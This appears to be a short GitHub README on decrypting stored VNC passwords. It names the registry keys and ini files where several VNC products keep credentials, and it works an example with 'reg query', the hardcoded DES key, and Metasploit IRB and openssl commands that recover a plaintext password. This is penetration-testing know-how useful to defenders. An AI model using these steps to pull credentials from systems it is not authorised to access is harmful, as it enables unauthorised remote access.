# PasswordDecrypts
Handy Stored Password Decryption Techniques

## VNC

VNC uses a hardcoded DES key to store credentials.  The same key is used across multiple product lines.

*RealVNC*  
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver  
Value: Password  
 
*TightVNC*  
HKEY_CURRENT_USER\Software\TightVNC\Server  
HKLM\SOFTWARE\TightVNC\Server\ControlPassword

tightvnc.ini  
vnc_viewer.ini  
Value: Password or PasswordViewOnly  
  
*TigerVNC*  
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4  
Value: Password  
  
*UltraVNC*  
C:\Program Files\UltraVNC\ultravnc.ini  
Value: passwd or passwd2  

### Test Case
I downloaded TightVNC version 2.8.11 and found my password was stored here: HKLM\SOFTWARE\TightVNC\Server\ControlPassword so I used reg query to extract the encrypted password:
  
```
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>reg query HKLM\SOFTWARE\TightVNC\Server /s

HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server
--- SNIP ---
    Password    REG_BINARY    D7A514D8C556AADE
    ControlPassword    REG_BINARY    1B8167BC0099C7DC
--- SNIP ---

```
With the encypted VNC password: 
D7A514D8C556AADE  

#### Metasploit Framework and the IRB (ruby shell)
I was able decrypt it easily using the Metasploit Framework and the IRB (ruby shell) with these 3 commands:  
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"   
require 'rex/proto/rfb'  
Rex::Proto::RFB::Cipher.decrypt ["YOUR ENCRYPTED VNC PASSWORD HERE"].pack('H*'), fixedkey   
  
```BASH
$> msfconsole

msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
 => "\u0017Rk\u0006#NX\a"
>> require 'rex/proto/rfb'
 => true
>> Rex::Proto::RFB::Cipher.decrypt ["D7A514D8C556AADE"].pack('H*'), fixedkey
 => "Secure!\x00"
>> 
```

#### Native Linux Tools
From https://github.com/billchaison/VNCDecrypt via https://miloserdov.org/?p=4854#65
```BASH
echo -n d7a514d8c556aade | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```
Outputs
```BASH
00000000  53 65 63 75 72 65 21 00                           |Secure!.|
00000008
```
